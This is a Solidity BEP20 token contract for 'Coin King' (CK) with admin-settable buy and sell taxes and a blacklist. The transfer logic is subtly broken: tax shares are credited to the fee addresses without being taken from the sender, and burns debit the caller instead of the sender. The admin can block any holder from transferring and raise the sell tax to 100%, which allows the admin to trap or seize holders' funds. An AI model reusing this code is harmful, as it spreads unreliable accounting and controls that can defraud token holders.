/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

// SPDX-License-Identifier: MIT
    pragma solidity 0.8.9;

    interface IBEP20 {
        /**
        * @dev Returns the amount of tokens in existence.
        */
        function totalSupply() external view returns (uint256);

        /**
        * @dev Returns the token decimals.
        */
        function decimals() external view returns (uint8);

        /**
        * @dev Returns the token symbol.
        */
        function symbol() external view returns (string memory);

        /**
        * @dev Returns the token name.
        */
        function name() external view returns (string memory);

        /**
        * @dev Returns the bep token owner.
        */
        function getOwner() external view returns (address);

        /**
        * @dev Returns the amount of tokens owned by `account`.
        */
        function balanceOf(address account) external view returns (uint256);
        /**
        * Destroys amount tokens from the caller.
        *
        */
        function burn(uint256 amount) external;
        
        /**
        * Destroys amount tokens from the given account if has sufficient allowance.
        *
        */
        function burnFrom(address account, uint256 amount) external;

        /**
        * @dev Moves `amount` tokens from the caller's account to `recipient`.
        *
        * Returns a boolean value indicating whether the operation succeeded.
        *
        * Emits a {Transfer} event.
        */
        function transfer(address recipient, uint256 amount) external returns (bool);

        /**
        * @dev Returns the remaining number of tokens that `spender` will be
        * allowed to spend on behalf of `owner` through {transferFrom}. This is
        * zero by default.
        *
        * This value changes when {approve} or {transferFrom} are called.
        */
        function allowance(address _owner, address spender) external view returns (uint256);

        /**
        * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
        *
        * Returns a boolean value indicating whether the operation succeeded.
        *
        * IMPORTANT: Beware that changing an allowance with this method brings the risk
        * that someone may use both the old and the new allowance by unfortunate
        * transaction ordering. One possible solution to mitigate this race
        * condition is to first reduce the spender's allowance to 0 and set the
        * desired value afterwards:
        * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        *
        * Emits an {Approval} event.
        */
        function approve(address spender, uint256 amount) external returns (bool);

        /**
        * @dev Moves `amount` tokens from `sender` to `recipient` using the
        * allowance mechanism. `amount` is then deducted from the caller's
        * allowance.
        *
        * Returns a boolean value indicating whether the operation succeeded.
        *
        * Emits a {Transfer} event.
        */
        function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

        /**
        * @dev Emitted when `value` tokens are moved from one account (`from`) to
        * another (`to`).
        *
        * Note that `value` may be zero.
        */
        event Transfer(address indexed from, address indexed to, uint256 value);

        /**
        * @dev Emitted when the allowance of a `spender` for an `owner` is set by
        * a call to {approve}. `value` is the new allowance.
        */
        event Approval(address indexed owner, address indexed spender, uint256 value);
        }

        /*
        * @dev Provides information about the current execution context, including the
        * sender of the transaction and its data. While these are generally available
        * via msg.sender and msg.data, they should not be accessed in such a direct
        * manner, since when dealing with GSN meta-transactions the account sending and
        * paying for execution may not be the actual sender (as far as an application
        * is concerned).
        *
        * This contract is only required for intermediate, library-like contracts.
        */
        contract Context {
        // Empty constructor, to prevent people from mistakenly deploying
        // an instance of this contract, which should be used via inheritance.
        constructor () { }

        function _msgSender() internal view returns (address) {
            return msg.sender;
        }

        function _msgData() internal view returns (bytes memory) {
            this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
            return msg.data;
        }
    }

    /**
    * @dev Wrappers over Solidity's arithmetic operations with added overflow
    * checks.
    *
    * Arithmetic operations in Solidity wrap on overflow. This can easily result
    * in bugs, because programmers usually assume that an overflow raises an
    * error, which is the standard behavior in high level programming languages.
    * `SafeMath` restores this intuition by reverting the transaction when an
    * operation overflows.
    *
    * Using this library instead of the unchecked operations eliminates an entire
    * class of bugs, so it's recommended to use it always.
    */
    library SafeMath {
        /**
        * @dev Returns the addition of two unsigned integers, reverting on
        * overflow.
        *
        * Counterpart to Solidity's `+` operator.
        *
        * Requirements:
        * - Addition cannot overflow.
        */
        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            uint256 c = a + b;
            require(c >= a, "SafeMath: addition overflow");

            return c;
        }

        /**
        * @dev Returns the subtraction of two unsigned integers, reverting on
        * overflow (when the result is negative).
        *
        * Counterpart to Solidity's `-` operator.
        *
        * Requirements:
        * - Subtraction cannot overflow.
        */
        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            return sub(a, b, "SafeMath: subtraction overflow");
        }

        /**
        * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
        * overflow (when the result is negative).
        *
        * Counterpart to Solidity's `-` operator.
        *
        * Requirements:
        * - Subtraction cannot overflow.
        */
        function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            require(b <= a, errorMessage);
            uint256 c = a - b;

            return c;
        }

        /**
        * @dev Returns the multiplication of two unsigned integers, reverting on
        * overflow.
        *
        * Counterpart to Solidity's `*` operator.
        *
        * Requirements:
        * - Multiplication cannot overflow.
        */
        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) {
            return 0;
            }

            uint256 c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow");

            return c;
        }

        /**
        * @dev Returns the integer division of two unsigned integers. Reverts on
        * division by zero. The result is rounded towards zero.
        *
        * Counterpart to Solidity's `/` operator. Note: this function uses a
        * `revert` opcode (which leaves remaining gas untouched) while Solidity
        * uses an invalid opcode to revert (consuming all remaining gas).
        *
        * Requirements:
        * - The divisor cannot be zero.
        */
        function div(uint256 a, uint256 b) internal pure returns (uint256) {
            return div(a, b, "SafeMath: division by zero");
        }

        /**
        * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
        * division by zero. The result is rounded towards zero.
        *
        * Counterpart to Solidity's `/` operator. Note: this function uses a
        * `revert` opcode (which leaves remaining gas untouched) while Solidity
        * uses an invalid opcode to revert (consuming all remaining gas).
        *
        * Requirements:
        * - The divisor cannot be zero.
        */
        function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            // Solidity only automatically asserts when dividing by 0
            require(b > 0, errorMessage);
            uint256 c = a / b;
            // assert(a == b * c + a % b); // There is no case in which this doesn't hold

            return c;
        }

        /**
        * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
        * Reverts when dividing by zero.
        *
        * Counterpart to Solidity's `%` operator. This function uses a `revert`
        * opcode (which leaves remaining gas untouched) while Solidity uses an
        * invalid opcode to revert (consuming all remaining gas).
        *
        * Requirements:
        * - The divisor cannot be zero.
        */
        function mod(uint256 a, uint256 b) internal pure returns (uint256) {
            return mod(a, b, "SafeMath: modulo by zero");
        }

        /**
        * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
        * Reverts with custom message when dividing by zero.
        *
        * Counterpart to Solidity's `%` operator. This function uses a `revert`
        * opcode (which leaves remaining gas untouched) while Solidity uses an
        * invalid opcode to revert (consuming all remaining gas).
        *
        * Requirements:
        * - The divisor cannot be zero.
        */
        function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            require(b != 0, errorMessage);
            return a % b;
        }
    }

    /**
    * @dev Contract module which provides a basic access control mechanism, where
    * there is an account (an owner) that can be granted exclusive access to
    * specific functions.
    *
    * By default, the owner account will be the one that deploys the contract. This
    * can later be changed with {transferOwnership}.
    *
    * This module is used through inheritance. It will make available the modifier
    * `onlyOwner`, which can be applied to your functions to restrict their use to
    * the owner.
    */
    contract Ownable is Context {
        address private _owner;
        address private _admin;
        event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

        /**
        * @dev Initializes the contract owner.
        */
        constructor (address masterWallet){
            _owner = masterWallet;
            _admin = masterWallet;
            emit OwnershipTransferred(address(0), masterWallet);
        }

        /**
        * @dev Returns the address of the current owner.
        */
        function owner() internal view returns (address) {
            return _owner;
        }


        /**
        * @dev Throws if called by any account other than the owner.
        */
        modifier onlyOwner() {
            require(_owner == _msgSender(), "Ownable: caller is not the owner");
            _;
        }
        
        /**
        * @dev Returns the address of the current funder.
        */
        function admin() internal view returns (address) {
            return _admin;
        }
        /**
        * @dev Throws if called by any account other than the owner.
        */
        modifier onlyAdmin(){
            require(_admin == _msgSender(), "Funder: caller is not the funder");
            _;
        }

        /**
        * @dev Leaves the contract without owner. It will not be possible to call
        * `onlyOwner` functions anymore. Can only be called by the current owner.
        *
        * NOTE: Renouncing ownership will leave the contract without an owner,
        * thereby removing any functionality that is only available to the owner.
        */
        function renounceOwnership() public onlyOwner {
            emit OwnershipTransferred(_owner, address(0));
            _owner = address(0);
        }

        /**
        * @dev Transfers ownership of the contract to a new account (`newOwner`).
        * Can only be called by the current owner.
        */
        function transferOwnership(address newOwner) public onlyOwner {
            _transferOwnership(newOwner);
        }

        /**
        * @dev Transfers ownership of the contract to a new account (`newOwner`).
        */
        function _transferOwnership(address newOwner) internal {
            require(newOwner != address(0), "Ownable: new owner is the zero address");
            emit OwnershipTransferred(_owner, newOwner);
            _owner = newOwner;
        }

        /**
        * @dev Transfers admin address to a new account.
        * Can only be called by admin
        */
        function _transferAdmin(address newAdmin) external onlyAdmin{
            require(newAdmin != address(0), "Admin: new admin cannot be zero adderss");
            _admin = newAdmin;
        }
    }

        contract BEP20CK is IBEP20, Ownable {
        using SafeMath for uint256;

        
        mapping (address => uint256) private _balances;

        mapping (address => mapping (address => uint256)) private _allowances;

        mapping (address => bool) private _isBlock;

        mapping (address => bool) private _isExcludedFromFee;

        uint8 constant private _decimals = 18;
        uint256 private _totalSupply = 540 * (10 ** uint256(_decimals));
        string constant private _name = "Coin King";
        string constant private _symbol = "CK";

        address private _communityAddress;
        address private _poolShareAddress;
        address private _teamAddress;

        address private _lpPairAddress;
        uint256 private _purchaseTax = 5;
        uint256 private _sellTax = 10;

        constructor(address masterWallet) Ownable(masterWallet) {
            _balances[masterWallet] = _totalSupply;
            _isExcludedFromFee[masterWallet] = true;
            _communityAddress = masterWallet;
            _poolShareAddress = masterWallet;
            _teamAddress = masterWallet;
            emit Transfer(address(0), masterWallet, _totalSupply);
        }

        /**
        * @dev Returns the bep token owner.
        */
        function getOwner() external view virtual override returns (address) {
            return owner();
        }

        /**
        * @dev Returns the token admin
        */
        function getAdmin() external view returns (address){
            return admin();
        }
        /**
        * @dev Returns the token decimals.
        */
        function decimals() external view virtual override returns (uint8) {
            return _decimals;
        }

        /**
        * @dev Returns the token symbol.
        */
        function symbol() external view virtual override returns (string memory) {
            return _symbol;
        }

        /**
        * @dev Returns the token name.
        */
        function name() external view virtual override returns (string memory) {
            return _name;
        }

        /**
        * @dev See {BEP20-totalSupply}.
        */
        function totalSupply() external view virtual override returns (uint256) {
            return _totalSupply;
        }

        /**
        * @dev See {BEP20-balanceOf}.
        */
        function balanceOf(address account) external view virtual override returns (uint256) {
            return _balances[account];
        }

        /**
        * @dev See {BEP20-transfer}.
        *
        * Requirements:
        *
        * - `recipient` cannot be the zero address.
        * - the caller must have a balance of at least `amount`.
        */
        function transfer(address recipient, uint256 amount) external virtual override returns (bool) {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }

        /**
        * @dev See {BEP20-allowance}.
        */
        function allowance(address owner, address spender) external view virtual override returns (uint256) {
            return _allowances[owner][spender];
        }

        /**
        * @dev See {BEP20-approve}.
        *
        * Requirements:
        *
        * - `spender` cannot be the zero address.
        */
        function approve(address spender, uint256 amount) external virtual override returns (bool) {
            _approve(_msgSender(), spender, amount);
            return true;
        }

        /**
        * @dev See {BEP20-transferFrom}.
        *
        * Emits an {Approval} event indicating the updated allowance. This is not
        * required by the EIP. See the note at the beginning of {BEP20};
        *
        * Requirements:
        * - `sender` and `recipient` cannot be the zero address.
        * - `sender` must have a balance of at least `amount`.
        * - the caller must have allowance for `sender`'s tokens of at least
        * `amount`.
        */
        function transferFrom(address sender, address recipient, uint256 amount) external virtual override returns (bool) {
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
            return true;
        }

        /**
        * @dev Atomically increases the allowance granted to `spender` by the caller.
        *
        * This is an alternative to {approve} that can be used as a mitigation for
        * problems described in {BEP20-approve}.
        *
        * Emits an {Approval} event indicating the updated allowance.
        *
        * Requirements:
        *
        * - `spender` cannot be the zero address.
        */
        function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
            _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
            return true;
        }

        /**
        * @dev Atomically decreases the allowance granted to `spender` by the caller.
        *
        * This is an alternative to {approve} that can be used as a mitigation for
        * problems described in {BEP20-approve}.
        *
        * Emits an {Approval} event indicating the updated allowance.
        *
        * Requirements:
        *
        * - `spender` cannot be the zero address.
        * - `spender` must have allowance for the caller of at least
        * `subtractedValue`.
        */
        function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
            _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
            return true;
        }
        /**
        * @dev Set an address into blacklist 
        * Can only be called by admin
        */
        function setBlockUser(address blackAddress) external onlyAdmin{
            _isBlock[blackAddress] = true;
        }

        /**
        * @dev Remove user from blacklist
        * Can only be called by admin
        */
        function removeBlockUser(address addr) external onlyAdmin{
            _isBlock[addr] = false;
        }

        function getTax() external view returns(uint256, uint256){
            return (_purchaseTax, _sellTax);
        }
        /**
        * @dev Set tax receiver addresses
        * Only can be called by admin
        */
        function setLPPairAddress(address addr) external onlyAdmin{
            _lpPairAddress = addr;
        }
        
        function setPoolAddress(address addr) external onlyAdmin{
            _poolShareAddress = addr;
        }
        
        function setCommunityAddress(address addr) external onlyAdmin{
            _communityAddress = addr;
        }

        function setTeamAddress(address addr) external onlyAdmin{
            _teamAddress = addr;
        }
        function setPurchaseTax(uint256 percent) external onlyAdmin{
            require(percent <= 100 && percent >=0, "TAX: tax should between 0 - 100");
            _purchaseTax = percent;
        }
        function setSellTax(uint256 percent) external onlyAdmin{
            require(percent <= 100 && percent >=0, "TAX: tax should between 0 - 100");
            _sellTax = percent;
        }
        /**
        * @dev Moves tokens `amount` from `sender` to `recipient`.
        *
        * This is internal function is equivalent to {transfer}, and can be used to
        * e.g. implement automatic token fees, slashing mechanisms, etc.
        *
        * Emits a {Transfer} event.
        *
        * Requirements:
        *
        * - `sender` cannot be the zero address.
        * - `recipient` cannot be the zero address.
        * - `sender` must have a balance of at least `amount`.
        */
        function _transfer(address sender, address recipient, uint256 amount) internal {
            require(sender != address(0), "BEP20: transfer from the zero address");
            require(recipient != address(0), "BEP20: transfer to the zero address");
            require(_isBlock[sender] == false, "BEP20: Sender is blocked");
            uint256 afterTax = amount;
            uint256 tax = 0;
            if(sender == _lpPairAddress){
                // purchase 10: 3销毁 2营销 3分红 2销毁ck
                afterTax = amount - amount * _purchaseTax / 100;
                tax = amount - afterTax;
                uint256 burnOSKAmount = tax * 30 / 100;
                uint256 marketAmount = tax * 20 / 100;
                uint256 sharePool = tax * 30 / 100;
                _burn(tax - burnOSKAmount - marketAmount - sharePool);

                _balances[_communityAddress] = _balances[_communityAddress].add(burnOSKAmount);
                emit Transfer(sender, _communityAddress, burnOSKAmount);

                _balances[_teamAddress] = _balances[_teamAddress].add(marketAmount);
                emit Transfer(sender, _teamAddress, marketAmount);

                _balances[_poolShareAddress] = _balances[_poolShareAddress].add(sharePool);
                emit Transfer(sender, _poolShareAddress, sharePool);


            }
            else {
                // sell 10: 4销毁 2营销 2分红 2销毁ck
                afterTax = amount - amount * _sellTax / 100;
                tax = amount - afterTax;
                uint256 burnOSKAmount = tax * 40 / 100;
                uint256 marketAmount = tax * 20 / 100;
                uint256 sharePool = tax * 20 / 100;
                _burn(tax - burnOSKAmount - marketAmount - sharePool);
                
                _balances[_communityAddress] = _balances[_communityAddress].add(burnOSKAmount);
                emit Transfer(sender, _communityAddress, burnOSKAmount);

                _balances[_teamAddress] = _balances[_teamAddress].add(marketAmount);
                emit Transfer(sender, _teamAddress, marketAmount);

                _balances[_poolShareAddress] = _balances[_poolShareAddress].add(sharePool);
                emit Transfer(sender, _poolShareAddress, sharePool);
            }
            _balances[sender] = _balances[sender].sub(afterTax, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(afterTax);
            emit Transfer(sender, recipient, afterTax);
        }


        /**
        * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
        *
        * This is internal function is equivalent to `approve`, and can be used to
        * e.g. set automatic allowances for certain subsystems, etc.
        *
        * Emits an {Approval} event.
        *
        * Requirements:
        *
        * - `owner` cannot be the zero address.
        * - `spender` cannot be the zero address.
        */
        function _approve(address owner, address spender, uint256 amount) internal {
            require(owner != address(0), "BEP20: approve from the zero address");
            require(spender != address(0), "BEP20: approve to the zero address");

            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        }
        /**
        * @dev Destroys amount tokens from account, reducing the total supply.
        *
        */
        function burn(uint256 amount) external virtual{
            _burn(amount);
        }
        function _burn(uint256 amount) internal virtual{
            address owner = _msgSender();
            address zeroAdress = address(0);
            require(_balances[owner] >= amount, "No sufficient amount from wallet");
            _balances[owner] -= amount;
            _balances[zeroAdress] += amount;
            _totalSupply -= amount;
            emit Transfer(owner, zeroAdress, amount);
        }
        function burnFrom(address account, uint256 amount) external virtual{
            _burnFrom(account, amount);
        }
        function _burnFrom(address account, uint256 amount) internal virtual{
            address spender = _msgSender();
            address zeroAddress = address(0);
            uint256 currentAllowance = _allowances[account][spender];
            require(currentAllowance >= amount, "ERC20: Insufficient allowance");
            _spendAllowance(account, spender, amount);
            _balances[account] -= amount;
            _balances[zeroAddress] += amount;
            _totalSupply -= amount;
            emit Transfer(account, zeroAddress, amount);
        }
        /**
        * @dev Spend `amount` form the allowance of `owner` toward `spender`.
        *
        * Does not update the allowance amount in case of infinite allowance.
        * Revert if not enough allowance is available.
        *
        * Might emit an {Approval} event.
        */
        function _spendAllowance(
            address owner,
            address spender,
            uint256 amount
        ) internal virtual {
            uint256 currentAllowance = _allowances[owner][spender];
            if (currentAllowance != type(uint256).max) {
                require(currentAllowance >= amount, "ERC20: insufficient allowance");
                unchecked {
                    _approve(owner, spender, currentAllowance - amount);
                }
            }
        }
    }